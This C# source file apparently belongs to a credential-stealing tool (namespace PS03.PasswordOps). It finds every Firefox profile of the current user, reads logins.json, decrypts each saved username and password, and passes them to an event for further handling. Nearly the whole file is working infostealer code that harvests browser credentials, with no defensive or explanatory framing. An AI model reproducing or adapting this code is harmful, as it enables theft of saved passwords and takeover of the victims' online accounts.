using System;
using System.Collections.Generic;
using System.IO;
using Newtonsoft.Json;
using PS03.PasswordOps.ChromeDecrypt;
using PS03.PasswordOps.FirefoxDecrypt.Models;

namespace PS03.PasswordOps.FirefoxDecrypt
{
    public class FDC
    {
        public delegate void PasswordsReaxdyHandler(List<FFData> data);

        private static readonly FFDecryptOps FFops = new FFDecryptOps();

        public static void Execute()
        {
            var user = Environment.UserName;
            var jsonDirs = Directory.GetDirectories("C:/Users/" + user + "/AppData/Roaming/Mozilla/Firefox/Profiles");

            foreach (var profile in jsonDirs)
            {
                FFops.Init(profile);
                var firefoxPasswords = new List<FFData>();

                var loginData = new FfLoginDataRoot();
                using (
                    var sr =
                        new StreamReader(
                            profile + "/logins.json"))
                {
                    var json = sr.ReadToEnd();
                    loginData = JsonConvert.DeserializeObject<FfLoginDataRoot>(json);
                }

                foreach (var data in loginData.logins)
                {
                    var username = FFops.Decrypt(data.encryptedUsername);
                    var password = FFops.Decrypt(data.encryptedPassword);
                    var host = data.hostname;
                    if(!password.StartsWith("{\"version\":1,\"accountData"))
                      firefoxPasswords.Add(new FFData {Host = host, Username = username, Password = password});
                }

                HandleOutputReady(firefoxPasswords);
            }
        }

        public static event FDC.PasswordsReaxdyHandler OnPasswordReady;

        public static void HandleOutputReady(List<FFData> output)
        {
            OnPasswordReady?.Invoke(output);
        }
    }
}